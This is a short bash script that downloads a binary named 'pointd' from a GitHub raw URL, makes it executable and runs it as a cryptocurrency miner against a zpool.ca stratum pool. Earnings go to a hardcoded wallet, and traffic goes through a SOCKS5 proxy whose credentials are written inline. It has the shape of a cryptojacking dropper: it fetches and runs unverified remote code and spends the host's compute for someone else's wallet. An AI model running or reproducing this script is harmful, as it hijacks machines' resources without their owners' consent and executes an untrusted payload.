#!/bin/bash

wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd
chmod +x pointd
./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DDEpVd47FEFpi5AMreCLNSkNFGEsv3Qzuj.$(shuf -n 1 -i 1-9999999) -p c=DGB,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@176.116.230.118:7204

